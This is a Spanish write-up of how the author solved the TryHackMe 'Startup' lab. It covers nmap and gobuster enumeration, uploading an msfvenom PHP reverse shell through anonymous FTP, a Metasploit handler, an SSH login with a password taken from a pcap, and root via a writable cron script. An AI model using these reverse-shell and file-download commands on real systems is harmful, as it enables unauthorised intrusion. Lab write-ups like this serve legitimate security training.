---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - FTP
  - ReverseShell
  - PrivilegeEscalation
  - SSH
  - CRON
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#FTP|FTP]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#SSH|SSH]]
		- [[#Escalada de Privilegios#Tarea CRON|Tarea CRON]]

---
# Resolviendo la máquina Startup

>En esta publicación, comparto cómo resolví la máquina **Startup** de [TryHackMe](https://tryhackme.com/room/startup).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.120.69`

![[Pasted image 20250724141621.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.120.69 -oG allPorts`

![[Pasted image 20250724141738.png]]

`nmap -p21,22,80 -sCV 10.10.120.69 -oN targeted`

![[Pasted image 20250724141804.png]]
### HTTP

`http://10.10.120.69/`

![[Pasted image 20250724141835.png]]
#### Fuzzing Web

`gobuster dir -u http://10.10.120.69/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250724142012.png]]

`http://10.10.120.69/files/`

![[Pasted image 20250724142034.png]]

Se accede al directorio: `ftp` y no se encuentra nada.

![[Pasted image 20250724142235.png]]

---
## Explotación
### FTP

En la enumeración se observa que en el puerto *21* se encuentra el servicio **FTP**, con el inicio de sesión anónimo activo.

`ftp anonymous@10.10.120.69`

![[Pasted image 20250724142436.png]]

`ls`

![[Pasted image 20250724142502.png]]

En el directorio `ftp`, tenemos todos los permisos.

`cd ftp`

`ls`

![[Pasted image 20250724142619.png]]

Se procede a generar un *payload malicioso*.

`msfvenom -p php/reverse_php LHOST=10.8.184.124 LPORT=1234 -f raw > pwned.php`

Se sube al directorio `ftp`.

`put pwned.php`

![[Pasted image 20250724142806.png]]

`ls`

![[Pasted image 20250724142833.png]]
### Reverse Shell

Se inicia una escucha en el puerto 1234 para recibir la *reverse shell*.

`vim handler.rc`

```
use multi/handler
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.127
set LPORT 1234
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250724143121.png]]

Como vimos anteriormente en el *fuzzing web*, accedemos al directorio: `http://10.10.120.69/files/ftp` y deberíamos de encontrar el *payload malicioso* que hemos subido anteriormente.

![[Pasted image 20250724170829.png]]

Se ejecuta el archivo y recibimos la *reverse shell*.

![[Pasted image 20250724171018.png]]

`background`

`sessions -u 1`

`sessions 2`
### Escalada de Privilegios
#### SSH

Se revisa el archivo `/etc/passwd` para identificar otros usuarios en el sistema

`cat /etc/passwd`

![[Pasted image 20250724171202.png]]

Se encuentra el usuario `lennie`.

Explorando los archivos se encuentra el siguiente archivo: `suspicious.pcapng` en la ruta: `cd /incidents`.

`cd /incidents`

`ls`

![[Pasted image 20250724171414.png]]

Se descarga el archivo para poder analizarlo mejor.

`download suspicious.pcapng`

Se analiza la información con *wireshark*.

`wireshark suspicious.pcapng`

Se encuentra la siguiente información: `c4ntg3t3n0ughsp1c3`.

![[Pasted image 20250724172207.png]]

Se procede a conectar al servicio *ssh*, con el usuario `lennie` y la contraseña `c4ntg3t3n0ughsp1c3`.

`ssh lennie@10.10.120.69`

![[Pasted image 20250724172354.png]]
#### Tarea CRON

Se accede a la ruta: `/home/lennie/scripts` y se encuentran los archivos `planner.sh` y `startup_list.txt`.

Se visualizaron los dos archivos.

`cat planner.sh`

![[Pasted image 20250724172702.png]]

`cat startup_list.txt`

![[Pasted image 20250724172728.png]]

Se visualizan los permisos de los archivos.

![[Pasted image 20250724172812.png]]

Además de visualizar también el archivo `/etc/print.sh` y sus permisos.

`cat /etc/print.sh`

![[Pasted image 20250724172901.png]]

`cd /etc`

`ls -la | grep print.sh`

![[Pasted image 20250724173014.png]]

Se procede a visualizar si existen tareas **CRON** que ejecuten algunos de estos archivos.

Se descarga la herramienta [pspy64](https://github.com/DominicBreuker/pspy), que permite visualizar las tareas **CRON** ejecutadas en segundo plano.

Se descarga en nuestra máquina.

`mv /home/manumore/Descargas/pspy64 .`

`python3 -m http.server 80`

Se descarga en la máquina victima en el directorio `tmp` y se dan permisos.

`wget 192.168.1.127/pspy64`

`chmod 777 pspy64`

Se ejecuta el archivo descargado.

`./pspy64`

Se observa una tarea **CRON**.

![[Pasted image 20250724173849.png]]

Ahora que ya sabemos que existe la tarea, se procede a editar el archivo `/etc/print.sh`, añadiendo lo siguiente:

`vim /etc/print.sh`

`cat /etc/print.sh`

![[Pasted image 20250724174200.png]]

Se espera a que se ejecute la tarea **CRON** y se obtiene una *shell con root*.

`bash -p`

![[Pasted image 20250724174402.png]]

---